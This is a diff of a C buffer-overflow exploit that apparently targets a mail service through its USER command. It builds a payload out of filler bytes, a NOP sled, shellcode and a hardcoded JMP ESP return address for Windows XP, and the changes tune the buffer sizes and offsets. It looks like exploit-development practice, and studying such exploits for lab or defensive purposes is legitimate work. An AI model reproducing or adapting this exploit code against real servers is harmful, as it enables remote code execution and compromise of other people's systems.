@@ -40,20 +40,20 @@ void exploit(int sock) {
       FILE *test;
       int *ptr;
       char userbuf[] = "USER madivan\r\n";
-      char evil[2607]; // equiv to offset 
-      char buf[3015];
+      char evil[3001];
+      char buf[3012];
       char receive[1024];
       char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
-                       // "\x90\x90\x90\x90\x90\x90\x90\x90";
-      memset(buf, 0x00, 3015);
-      memset(evil, 0x00, 2607);
-      memset(evil, 0x43, 2606);
-      ptr = &evil;  // memory location of evil
-      ptr = ptr + 643; // 2608 whats this 652 ag
-      memcpy(ptr, &nopsled, 16); // whats this
-      ptr = ptr + 4; 
-      memcpy(ptr, &shellcode, 351); // what is this
-      *(long*)&evil[2606] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP 2600
+                      // "\x90\x90\x90\x90\x90\x90\x90\x90";
+      memset(buf, 0x00, 3012);
+      memset(evil, 0x00, 3001);
+      memset(evil, 0x43, 3000);
+      ptr = &evil;
+      ptr = ptr + 652; // 2608 
+      memcpy(ptr, &nopsled, 8); // ag 16
+      ptr = ptr + 4;
+      memcpy(ptr, &shellcode, 351); // ag 317
+      *(long*)&evil[2600] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP
 
       // banner
       recv(sock, receive, 200, 0);
@@ -76,7 +76,6 @@ void exploit(int sock) {
       printf("Evil length 4: %d bytes\n",strlen(evil));
       printf("nop length: %d bytes\n",strlen(nopsled));
       printf("Buffer length: %d bytes\n",strlen(buf));
-
 
 
 }
@@ -127,3 +126,4 @@ int main(int argc, char **argv)
     closesocket(sock);
     return 0;
 }
+
